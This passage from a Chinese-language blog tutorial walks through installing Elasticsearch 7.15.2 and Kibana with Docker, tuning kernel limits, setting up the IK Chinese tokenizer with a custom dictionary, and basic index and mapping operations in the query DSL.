安装ES</h2><p>使用docker安装单点Elasticsearch，步骤如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker network create elastic  </span><br><span class=\"line\">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.15.2  </span><br><span class=\"line\">docker run -di --name es --net elastic -p 192.168.56.181:9200:9200 -p 192.168.56.181:9300:9300 -e &quot;discovery.type=single-node&quot; docker.elastic.co/elasticsearch/elasticsearch:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>9200端口(Web管理平台端口)  9300(服务默认端口)</p>\n<p>浏览器输入地址访问：<code>http://192.168.56.181:9200/</code></p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/7.png\"><br>3.  <strong>系统参数配置</strong></p>\n<p>es发现重启启动失败了，这时什么原因呢？</p>\n<p>这与我们刚才修改的配置有关，因为elasticsearch在启动的时候会进行一些检查，比如最多打开的文件的个数以及虚拟内存区域数量等等，如果你放开了此配置，意味着需要打开更多的文件以及虚拟内存，所以我们还需要系统调优 修改vi &#x2F;etc&#x2F;security&#x2F;limits.conf ，追加内容 (nofile是单个进程允许打开的最大文件个数 soft nofile 是软限制 hard nofile是硬限制 )</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\* soft nofile 65536  </span><br><span class=\"line\">\\* hard nofile 65536  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>修改vi &#x2F;etc&#x2F;sysctl.conf，追加内容 (限制一个进程可以拥有的VMA(虚拟内存区域)的数量 )</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vm.max\\_map\\_count\\=655360  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行下面命令 修改内核参数马上生效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sysctl \\-p  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>重新启动虚拟机，再次启动容器，发现已经可以启动并远程访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">reboot  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-安装Kibana\"><a href=\"#2-2-安装Kibana\" class=\"headerlink\" title=\"2.2 安装Kibana\"></a>2.2 安装Kibana</h2><p>Kibana是一个针对Elasticsearch的开源分析及可视化平台，用来搜索、查看交互存储在Elasticsearch索引中的数据。使用Kibana，可以通过各种图表进行高级数据分析及展示。</p>\n<p>Kibana让海量数据更容易理解。它操作简单，基于浏览器的用户界面可以快速创建仪表板（dashboard）实时显示Elasticsearch查询动态。</p>\n<p>设置Kibana非常简单。</p>\n<p>无需编码或者额外的基础架构，几分钟内就可以完成Kibana安装并启动Elasticsearch索引监测。</p>\n<p>Query DSL是一个Java开源框架用于构建类型安全的SQL查询语句。</p>\n<p>采用API代替传统的拼接字符串来构造查询语句。</p>\n<p>目前QueryDSL支持的平台包括JPA，JDO，SQL，Java Collections，RDF，Lucene，Hibernate Search。elasticsearch提供了一整套基于JSON的DSL语言来定义查询。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker pull docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\">docker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e &quot;ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200&quot; docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>拉取kibana镜像</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker pull docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>安装kibana容器</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e &quot;ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200&quot; docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>修改配置文件</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker exec -it kb /bin/bash  </span><br><span class=\"line\">vi config/kibana.yml  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>好像不改也可以，因为上面docker启动有了ES地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#修改elasticsarch.hosts: \\[ &quot;http://elasticsearch:9200&quot; \\]，如下：  </span><br><span class=\"line\">elasticsearch.hosts: \\[ &quot;http://192.168.56.181:9200&quot; \\]  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-3通过脚本一键启动ES\"><a href=\"#2-3通过脚本一键启动ES\" class=\"headerlink\" title=\"2.3通过脚本一键启动ES\"></a>2.3通过脚本一键启动ES</h2><p>通过提供的脚本，和配置文件，可以一键启动ES</p>\n<p>这个非常的容易，非常的轻量级。 具体请参见视频。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/8.png\"><br>启动完之后的效果</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/9.png\"><br>接下来，可以访问es</p>\n<p><a href=\"http://cdh1:9200/\">http://cdh1:9200</a></p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/10.png\"><br>接下来，可以访问 Kibana</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">默认的地址     http://cdh1:5601               </span><br><span class=\"line\">  </span><br><span class=\"line\">的一键环境地址     http://cdh1:5601             </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-4使用-DSL-操作ES\"><a href=\"#2-4使用-DSL-操作ES\" class=\"headerlink\" title=\"2.4使用 DSL 操作ES\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/11.png\"><br>2.4使用 DSL 操作ES</h2><p>在 Kibana的开发工具界面，可以执行 DSL 去进行ES的查询。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/12.png\"><br>es开发，常常需要用到DSL语法去定义好 es的查询语句。</p>\n<p>就像 myql开发，需要提前定义好 sql语句，并进行sql 的执行和测试一样。</p>\n<h3 id=\"2-4-1DSL-定义基本介绍\"><a href=\"#2-4-1DSL-定义基本介绍\" class=\"headerlink\" title=\"2.4.1DSL 定义基本介绍\"></a>2.4.1DSL 定义基本介绍</h3><h5 id=\"DSL（Domain-Specific-Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\"><a href=\"#DSL（Domain-Specific-Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\" class=\"headerlink\" title=\"DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\"></a>DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。</h5><p>在Elasticsearch中，可用DSL语法来定义查询和过滤条件，以及执行聚合操作。</p>\n<p>DSL语法 具有JSON格式，因此它非常易于阅读和编写。</p>\n<h3 id=\"2-4-2DSL-定义语法说明\"><a href=\"#2-4-2DSL-定义语法说明\" class=\"headerlink\" title=\"2.4.2DSL 定义语法说明\"></a>2.4.2DSL 定义语法说明</h3><h6 id=\"（1）关键字-Keywords\"><a href=\"#（1）关键字-Keywords\" class=\"headerlink\" title=\"（1）关键字(Keywords)\"></a>（1）关键字(Keywords)</h6><ul>\n<li><p>DSL通常会定义一组关键字，这些关键字具有特殊含义，并在DSL中起到关键作用。关键字通常不能用作标识符或变量名。</p>\n</li>\n<li><p>示例：在一个简单的数学表达式DSL中，可能会定义关键字如”add”、”subtract”等来表示加法和减法操作。</p>\n</li>\n</ul>\n<h6 id=\"（2）标识符-Identifiers\"><a href=\"#（2）标识符-Identifiers\" class=\"headerlink\" title=\"（2）标识符(Identifiers)\"></a>（2）标识符(Identifiers)</h6><ul>\n<li><p>标识符是用来表示变量名、函数名或其他用户定义的名称。它们需要遵循特定的命名规则，如大小写敏感、不包含特殊字符等。</p>\n</li>\n<li><p>示例：在一个配置文件DSL中，可以使用标识符来表示不同的配置项，如”username”、”password”等。</p>\n</li>\n</ul>\n<h6 id=\"（3）表达式-Expressions\"><a href=\"#（3）表达式-Expressions\" class=\"headerlink\" title=\"（3）表达式(Expressions)\"></a>（3）表达式(Expressions)</h6><ul>\n<li><p>表达式是DSL中最基本的构建块，用于计算或产生某个值。表达式可以包括变量、常量、运算符和函数调用。</p>\n</li>\n<li><p>示例：在一个数学表达式DSL中，可以将”2 + 3”作为一个表达式，计算结果为5。</p>\n</li>\n</ul>\n<h6 id=\"（4）运算符-Operators\"><a href=\"#（4）运算符-Operators\" class=\"headerlink\" title=\"（4）运算符(Operators)\"></a>（4）运算符(Operators)</h6><ul>\n<li><p>运算符用于执行各种操作，例如算术运算、逻辑运算、比较运算等。DSL中的运算符根据所涉及的领域和需求而定。</p>\n</li>\n<li><p>示例：在一个布尔表达式DSL中，可以定义逻辑运算符如”and”、”or”用于连接多个条件。</p>\n</li>\n</ul>\n<h6 id=\"（5）函数调用-Function-Calls\"><a href=\"#（5）函数调用-Function-Calls\" class=\"headerlink\" title=\"（5）函数调用(Function Calls)\"></a>（5）函数调用(Function Calls)</h6><ul>\n<li><p>DSL可以支持函数调用，允许用户使用预定义或自定义的函数来完成特定的任务。函数调用通常由函数名称和传递给函数的参数组成。</p>\n</li>\n<li><p>示例：在一个日期处理DSL中，可以定义函数”formatDate(date, format)”，其中”date”是日期值，”format”是日期格式字符串。</p>\n</li>\n</ul>\n<h6 id=\"（6）控制流-Control-Flow\"><a href=\"#（6）控制流-Control-Flow\" class=\"headerlink\" title=\"（6）控制流(Control Flow)\"></a>（6）控制流(Control Flow)</h6><ul>\n<li><p>控制流语句用于控制程序的执行流程，例如条件语句(if-else)和循环语句(while、for)等。DSL可以支持特定的控制流语句来满足领域特定需求。</p>\n</li>\n<li><p>示例：在一个工作流程DSL中，可以使用条件语句来判断某个条件是否满足并执行相应的操作。</p>\n</li>\n</ul>\n<h6 id=\"（7）注释-Comments\"><a href=\"#（7）注释-Comments\" class=\"headerlink\" title=\"（7）注释(Comments)\"></a>（7）注释(Comments)</h6><ul>\n<li><p>注释用于向DSL代码添加说明性文本，以便开发人员理解和维护代码。注释通常不会被编译或执行，仅用于阅读目的。</p>\n</li>\n<li><p>示例：在DSL中，可以使用双斜杠(&#x2F;&#x2F;)或特定的注释标记来添加注释，如：“&#x2F;&#x2F; 这是一个示例注释”。</p>\n</li>\n</ul>\n<h3 id=\"2-4-3DSL常见语法\"><a href=\"#2-4-3DSL常见语法\" class=\"headerlink\" title=\"2.4.3DSL常见语法\"></a>2.4.3DSL常见语法</h3><blockquote>\n<p>文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》</p>\n</blockquote>\n<h1 id=\"3-ES-的分词器\"><a href=\"#3-ES-的分词器\" class=\"headerlink\" title=\"3 ES 的分词器\"></a>3 ES 的分词器</h1><h2 id=\"3-1-倒排索引\"><a href=\"#3-1-倒排索引\" class=\"headerlink\" title=\"3.1 倒排索引\"></a>3.1 倒排索引</h2><p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/13.png\"><br>如上图</p>\n<ul>\n<li><p>左边的是正排索引，通过文档的id如查找文档的内容</p>\n</li>\n<li><p>右边的是倒排索引，通过单词统计次数以及文档的位置，</p>\n</li>\n</ul>\n<p>如Elasticsearch出现的次数为3，在id&#x3D;1，id&#x3D;2，id&#x3D;3都出现过，且位置分别为1，0，0</p>\n<h2 id=\"3-2-默认分词器\"><a href=\"#3-2-默认分词器\" class=\"headerlink\" title=\"3.2 默认分词器\"></a>3.2 默认分词器</h2><p>默认分词器对于英文分词的效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;text&quot;: &quot;You can use Elasticsearch to store, search, and manage data&quot;,  </span><br><span class=\"line\">  &quot;analyzer&quot;: &quot;standard&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果如下：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/14.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;text&quot;: &quot;中华人民共和国人民大会堂&quot;,  </span><br><span class=\"line\">  &quot;analyzer&quot;: &quot;standard&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-3-中文分词\"><a href=\"#3-3-中文分词\" class=\"headerlink\" title=\"3.3 中文分词\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/15.png\"><br>3.3 中文分词</h2><p>中文分词是中文文本处理的一个基础步骤，也是中文人机自然语言交互的基础模块。</p>\n<p>不同于英文的是，中文句子中没有词的界限，因此在进行中文自然语言处理时，通常需要先进行分词，</p>\n<p>分词效果将直接影响词性、句法树等模块的效果。</p>\n<p>当然分词只是一个工具，场景不同，要求也不同。</p>\n<p>部分分词工具如下：</p>\n<ul>\n<li><p>中科院计算所NLPIR <a href=\"http://ictclas.nlpir.org/nlpir/\">http://ictclas.nlpir.org/nlpir/</a></p>\n</li>\n<li><p>ansj分词器 <a href=\"https://github.com/NLPchina/ansj/_seg\">https://github.com/NLPchina/ansj\\_seg</a></p>\n</li>\n<li><p>哈工大的LTP <a href=\"https://github.com/HIT-SCIR/ltp\">https://github.com/HIT-SCIR/ltp</a></p>\n</li>\n<li><p>清华大学THULAC <a href=\"https://github.com/thunlp/THULAC\">https://github.com/thunlp/THULAC</a></p>\n</li>\n<li><p>斯坦福分词器 <a href=\"https://nlp.stanford.edu/software/segmenter.shtml\">https://nlp.stanford.edu/software/segmenter.shtml</a></p>\n</li>\n<li><p>Hanlp分词器 <a href=\"https://github.com/hankcs/HanLP\">https://github.com/hankcs/HanLP</a></p>\n</li>\n<li><p>结巴分词 <a href=\"https://github.com/yanyiwu/cppjieba\">https://github.com/yanyiwu/cppjieba</a></p>\n</li>\n<li><p>KCWS分词器(字嵌入+Bi-LSTM+CRF) <a href=\"https://github.com/koth/kcws\">https://github.com/koth/kcws</a></p>\n</li>\n<li><p>ZPar <a href=\"https://github.com/frcchang/zpar/releases\">https://github.com/frcchang/zpar/releases</a></p>\n</li>\n<li><p>IKAnalyzer <a href=\"https://github.com/wks/ik-analyzer\">https://github.com/wks/ik-analyzer</a></p>\n</li>\n</ul>\n<h2 id=\"3-4-IK分词器\"><a href=\"#3-4-IK分词器\" class=\"headerlink\" title=\"3.4 IK分词器\"></a>3.4 IK分词器</h2><p>IK分词器下载地址<a href=\"https://github.com/medcl/elasticsearch-analysis-ik/releases\">https://github.com/medcl/elasticsearch-analysis-ik/releases</a> 将ik分词器上传到服务器上，然后解压，并改名字为ik</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir ~/ik  </span><br><span class=\"line\">mv elasticsearch-analysis-ik-7.15.2.zip ~/ik  </span><br><span class=\"line\">unzip elasticsearch-analysis-ik-7.15.2.zip  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将ik目录拷贝到docker容器的plugins目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker cp ./ik es:/usr/share/elasticsearch/plugins  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>特别说明，的一键启动版本，已经默认戴上了IK分词器</p>\n</blockquote>\n<p>IKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包，IK分词器分为两种模式</p>\n<ol>\n<li><strong>ik_max_word：会将文本做最细粒度的拆分</strong></li>\n</ol>\n<p>比如会将“中华人民共和国人民大会堂”拆分为“中华人民共和国、中华人民、中华、华人、人民共和国、人民、共和国、大会堂、大会、会堂等词语。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">&quot;text&quot;:&quot;中华人民共和国人民大会堂&quot;,  </span><br><span class=\"line\">&quot;analyzer&quot;:&quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/16.png\"><br>2.  <strong>ik_smart：会做最粗粒度的拆分</strong></p>\n<p>比如会将“中华人民共和国人民大会堂”拆分为中华人民共和国、人民大会堂。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;text&quot;: &quot;中华人民共和国人民大会堂&quot;,  </span><br><span class=\"line\">  &quot;analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-5-自定义扩展字典\"><a href=\"#3-5-自定义扩展字典\" class=\"headerlink\" title=\"3.5 自定义扩展字典\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/17.png\"><br>3.5 自定义扩展字典</h2><p>IK分词器的两种模式的最佳实践是：索引时用ik_max_word，搜索时用ik_smart，索引时最大化的将文章内容分词，搜索时更精确的搜索到想要的结果。</p>\n<p>举个例子：用户输入“华为手机”搜索，此时应该搜索出“华为手机”的商品，而不是“华为”和“手机”这两个词，这样会搜索出华为其它的商品，</p>\n<p>此时使用ik_smart和ik_max_word都会将华为手机拆分为华为和手机两个词，那些只包括“华为”这个词的信息也被搜索出来了，我的目标是搜索只包含华为手机这个词的信息，这没有满足我的目标。</p>\n<p>ik_smart默认情况下分词“华为手机”，依然会分成两个词“华为”和“手机”，这时需要使用自定义扩展字典</p>\n<ol>\n<li><strong>进入es</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker exec -it es /bin/bash  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>增加自定义字典文件</strong></li>\n</ol>\n<p>如果容器编辑乱码，可以在宿主机编辑，然后拷贝到容器中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#进入ik配置目录  </span><br><span class=\"line\">cd plugins/ik/config/  </span><br><span class=\"line\">vi new\\_word.dic  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">老铁  </span><br><span class=\"line\">王者荣耀  </span><br><span class=\"line\">洪荒之力  </span><br><span class=\"line\">共有产权房  </span><br><span class=\"line\">一带一路  </span><br><span class=\"line\">java日知录  </span><br><span class=\"line\">华为手机  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>修改配置文件</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vi IKAnalyzer.cfg.xml  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class=\"line\">&lt;!DOCTYPE properties SYSTEM &quot;http://java.sun.com/dtd/properties.dtd&quot;\\&gt;  </span><br><span class=\"line\">&lt;properties&gt;  </span><br><span class=\"line\">        &lt;comment&gt;IK Analyzer 扩展配置&lt;/comment&gt;  </span><br><span class=\"line\">        &lt;!--用户可以在这里配置自己的扩展字典 --&gt;  </span><br><span class=\"line\">        &lt;entry key=&quot;ext\\_dict&quot;\\&gt;new\\_word.dic&lt;/entry&gt;  </span><br><span class=\"line\">         &lt;!--用户可以在这里配置自己的扩展停止词字典--&gt;  </span><br><span class=\"line\">        &lt;entry key=&quot;ext\\_stopwords&quot;\\&gt;&lt;/entry&gt;  </span><br><span class=\"line\">        &lt;!--用户可以在这里配置远程扩展字典 --&gt;  </span><br><span class=\"line\">        &lt;!-- &lt;entry key=&quot;remote\\_ext\\_dict&quot;\\&gt;words\\_location&lt;/entry&gt; --&gt;  </span><br><span class=\"line\">        &lt;!--用户可以在这里配置远程扩展停止词字典--&gt;  </span><br><span class=\"line\">        &lt;!-- &lt;entry key=&quot;remote\\_ext\\_stopwords&quot;\\&gt;words\\_location&lt;/entry&gt; --&gt;  </span><br><span class=\"line\">&lt;/properties&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>拷贝到宿主机</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker cp es:/usr/share/elasticsearch/plugins/elasticsearch-analysis-ik/config ~/ik  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>重启</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker restart es  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"4-高级的DSL-查询\"><a href=\"#4-高级的DSL-查询\" class=\"headerlink\" title=\"4 高级的DSL 查询\"></a>4 高级的DSL 查询</h1><p>前面介绍了基础的DSL查询，接下来，介绍一下高级的DSL 查询</p>\n<p>ES提供基于DSL(Domain Specific Language)的索引查询模式，</p>\n<p>DSL查询基于JSON定义查询</p>\n<p>Wikipedia对于DSL的定义”<strong>为了解决某一类任务而专门设计的计算机语言”</strong></p>\n<p>大师Martin Fowler对于DSL定义“<strong>DSL 通过在表达能力上做的妥协换取在某一领域内的高效</strong>”</p>\n<p>我们在使用ES的时候，避免不了使用DSL语句去查询，就像使用关系型数据库的时候要学会SQL语法一样。</p>\n<p>如果我们学习好了DSL语法的使用，那么在日后使用和使用Java Client调用时候也会变得非常简单。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/18.png\"></p>\n<blockquote>\n<p>Elasticsearch provides a full Query DSL (Domain Specific Language) based on JSON to define queries. Think of the Query DSL as an AST (Abstract Syntax Tree) of queries</p>\n</blockquote>\n<h2 id=\"4-1-管理索引\"><a href=\"#4-1-管理索引\" class=\"headerlink\" title=\"4.1 管理索引\"></a>4.1 管理索引</h2><p>查看所有的索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/indices?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/19.png\"></p>\n<ol>\n<li><strong>删除某个索引</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DELETE /skuinfo  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>新增索引</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /user  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>创建映射</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /user/\\_mapping  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;properties&quot;: &#123;  </span><br><span class=\"line\">    &quot;name&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;city&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;description&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>新增文档数据</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /user/\\_doc/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;李四&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:22,  </span><br><span class=\"line\">  